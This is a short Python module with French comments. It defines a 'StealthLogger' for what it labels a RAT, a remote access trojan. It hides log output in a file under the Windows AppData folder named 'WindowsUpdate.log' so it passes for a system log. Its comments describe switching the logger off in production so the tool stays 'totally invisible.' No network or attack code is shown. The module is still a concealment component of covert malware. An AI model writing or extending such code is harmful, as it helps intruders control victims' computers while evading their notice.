import os
import logging
from datetime import datetime

class StealthLogger:
    """Logger qui écrit dans un fichier caché au lieu d'utiliser print()"""
    
    def __init__(self, log_file=None, enabled=True):
        self.enabled = enabled
        
        if not self.enabled:
            return
            
        # Créer le fichier de log dans AppData (caché)
        if log_file is None:
            app_data = os.getenv('APPDATA') or os.getenv('TEMP') or '.'
            log_dir = os.path.join(app_data, 'Microsoft', 'Windows', 'Logs')
            os.makedirs(log_dir, exist_ok=True)
            log_file = os.path.join(log_dir, 'WindowsUpdate.log')
        
        self.log_file = log_file
        
        # Configurer le logging
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger('RAT')
    
    def info(self, message):
        if self.enabled:
            self.logger.info(message)
    
    def error(self, message):
        if self.enabled:
            self.logger.error(message)
    
    def debug(self, message):
        if self.enabled:
            self.logger.debug(message)
    
    def warning(self, message):
        if self.enabled:
            self.logger.warning(message)
    
    def critical(self, message):
        if self.enabled:
            self.logger.critical(message)


# Logger global - Désactiver en production pour être totalement invisible
# Mettre enabled=True seulement pour le debug
logger = StealthLogger(enabled=True)  # Mettre False pour production
